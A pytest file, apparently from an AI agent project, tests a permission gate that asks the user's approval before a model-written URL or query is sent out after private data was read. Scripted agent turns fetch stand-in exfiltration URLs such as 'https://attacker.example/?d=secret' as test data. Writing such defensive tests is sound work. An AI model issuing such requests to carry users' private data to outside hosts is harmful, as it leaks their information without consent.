"""Private data must not leave through a model-written URL or query without the user's approval."""

import pytest
from test_agent import PROVIDER, Script, call
from test_runs import TOKEN

from piyo.agent import Agent, ToolFinished
from piyo.models.turn import Message, ToolCall, TurnDone
from piyo.safety import PermissionGate
from piyo.safety.exfil import OutboundGuard, history_has_private, named_domains, produces_private_data
from piyo.server import app as server
from piyo.skills import SkillRegistry
from piyo.tools import RunContext, Tool, ToolRegistry, core_tools
from piyo.tools.browser.tools import browser_tools
from piyo.tools.search import search_tools
from piyo.tools.web import web_tools

READ_CALL = ToolCall(id="h1", name="files__read", arguments={})

SKILL = """---
name: lookup
description: Look things up.
requires:
  tools: [files.read, plain.read, web.fetch, web.search]
---
Use the tools.
"""


@pytest.fixture
def skills(tmp_path):
    d = tmp_path / "u" / "lookup"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(SKILL, encoding="utf-8")
    return SkillRegistry(builtin_dir=tmp_path / "none", user_dir=tmp_path / "u")


def make(script, skills, answer=True):
    asked: list = []
    fetched: list = []

    async def approver(req):
        asked.append(req)
        return answer

    async def read(args, ctx):
        return "my private notes"

    async def fetch(args, ctx):
        fetched.append(args.get("url") or args.get("query"))
        return "page"

    tools = ToolRegistry(
        core_tools()
        + [
            Tool("files.read", "Read a file", read),  # private by name
            Tool("plain.read", "Read something public", read),
            Tool("web.fetch", "Fetch", fetch, guard=OutboundGuard("url", "url")),
            Tool("web.search", "Search", fetch, guard=OutboundGuard("query", "query")),
        ]
    )
    return Agent(PROVIDER, "m", tools, skills, PermissionGate(approver), turn_fn=script), asked, fetched


def run_script(*steps):
    return Script(
        [TurnDone(tool_calls=[call("load_skill", name="lookup")])],
        *[[TurnDone(tool_calls=[ToolCall(id=f"c{i}", name=n, arguments=a) for i, (n, a) in enumerate(s)])]
          for s in steps],
        [TurnDone(text="done")],
    )


async def go(agent, text="hi", history=None):
    messages = [*(history or []), Message(role="user", content=text)]
    return [e async for e in agent.run(messages)]


async def test_an_untainted_run_fetches_and_searches_without_asking(skills):
    script = run_script([("plain.read", {}), ("web.fetch", {"url": "https://anywhere.example/x"}),
                         ("web.search", {"query": "weather"})])
    agent, asked, fetched = make(script, skills)
    await go(agent)
    assert asked == [] and fetched == ["https://anywhere.example/x", "weather"]


async def test_after_reading_private_data_an_unnamed_host_asks_and_can_be_declined(skills):
    script = run_script([("files.read", {}), ("web.fetch", {"url": "https://attacker.example/?d=secret"})])
    agent, asked, fetched = make(script, skills, answer=False)
    events = await go(agent)
    assert fetched == []  # declined: nothing was sent
    assert len(asked) == 1 and asked[0].tool == "web.fetch"
    assert "attacker.example" in asked[0].summary and "private data" in asked[0].summary
    assert [e.is_error for e in events if isinstance(e, ToolFinished)][-1] is True


async def test_a_host_the_user_named_needs_no_approval_even_after_private_data(skills):
    script = run_script([("files.read", {}), ("web.fetch", {"url": "https://docs.example.com/page"}),
                         ("web.fetch", {"url": "https://evil.example.org/"})])
    agent, asked, fetched = make(script, skills)
    await go(agent, "read my notes then look at example.com for me")
    assert fetched == ["https://docs.example.com/page", "https://evil.example.org/"]
    assert [r.arguments["url"] for r in asked] == ["https://evil.example.org/"]  # only the unnamed one


async def test_an_email_address_does_not_count_as_naming_a_host(skills):
    script = run_script([("files.read", {}), ("web.fetch", {"url": "https://evil.example/"})])
    agent, asked, _ = make(script, skills)
    await go(agent, "mail me at someone@evil.example after you read my notes")
    assert len(asked) == 1


async def test_an_approved_host_is_not_asked_about_again_in_the_run(skills):
    script = run_script([("files.read", {}), ("web.fetch", {"url": "https://a.example/1"}),
                         ("web.fetch", {"url": "https://a.example/2"}), ("web.fetch", {"url": "https://b.example/"})])
    agent, asked, fetched = make(script, skills)
    await go(agent)
    assert [r.arguments["url"] for r in asked] == ["https://a.example/1", "https://b.example/"]
    assert len(fetched) == 3


async def test_every_search_asks_once_tainted(skills):
    script = run_script(
        [("files.read", {}), ("web.search", {"query": "one"}), ("web.search", {"query": "two"})]
    )
    agent, asked, fetched = make(script, skills)
    await go(agent)
    assert [r.arguments["query"] for r in asked] == ["one", "two"] and fetched == ["one", "two"]


async def test_private_data_from_an_earlier_turn_taints_a_new_run(skills):
    earlier = [
        Message(role="user", content="read my notes"),
        Message(role="assistant", content="", tool_calls=[READ_CALL]),
        Message(role="tool", content="my private notes", tool_call_id="h1"),
        Message(role="assistant", content="done"),
    ]
    agent, asked, _ = make(run_script([("web.fetch", {"url": "https://x.example/"})]), skills)
    await go(agent, "now look it up", history=earlier)
    assert len(asked) == 1


async def test_a_failed_private_read_does_not_taint(skills):
    failed = [
        Message(role="assistant", content="", tool_calls=[READ_CALL]),
        Message(role="tool", content="no such file", tool_call_id="h1", is_error=True),
    ]
    assert not history_has_private(failed)


def test_the_guard_asks_when_it_cannot_decide():
    class Broken:
        def reason(self, args, ctx):
            raise RuntimeError

    tool = Tool("web.fetch", "x", lambda a, c: None, guard=Broken())
    assert tool.guard_reason({}, RunContext(skills=None))


def test_named_domains_and_classification():
    assert named_domains("see Example.com, https://docs.rust-lang.org/x and a@b.org") == {
        "example.com", "docs.rust-lang.org"}
    assert produces_private_data("gmail__search") and produces_private_data("memory.recall")
    assert not produces_private_data("web.fetch")


def test_the_real_outbound_tools_carry_the_guard():
    tools = {t.name: t for t in web_tools() + search_tools() + browser_tools(session=None)}
    assert all(tools[n].guard is not None for n in ("web.fetch", "web.search", "browser.open"))


# Every registered tool is either known to return the user's private data or known not to. A new tool fails
# this test until someone decides which: the answer decides whether outbound tools ask after it runs.
PUBLIC = {
    "browser.click", "browser.open", "browser.read", "browser.screenshot", "browser.type", "browser.wait",
    "current_time", "load_skill", "memory.forget", "memory.remember", "schedule.cancel", "schedule.create",
    "schedule.list", "weather.forecast", "web.fetch", "web.search",
}


def test_every_registered_tool_is_classified(tmp_path):
    skills = SkillRegistry(builtin_dir=tmp_path / "n", user_dir=tmp_path / "u")
    app = server.create_app(TOKEN, skills=skills, start_scheduler=False)
    unclassified = {n for n in app.state.tools.names() if n not in PUBLIC and not produces_private_data(n)}
    assert not unclassified, f"decide whether these return private data (safety/exfil.py): {unclassified}"
    assert not {n for n in PUBLIC if produces_private_data(n)}
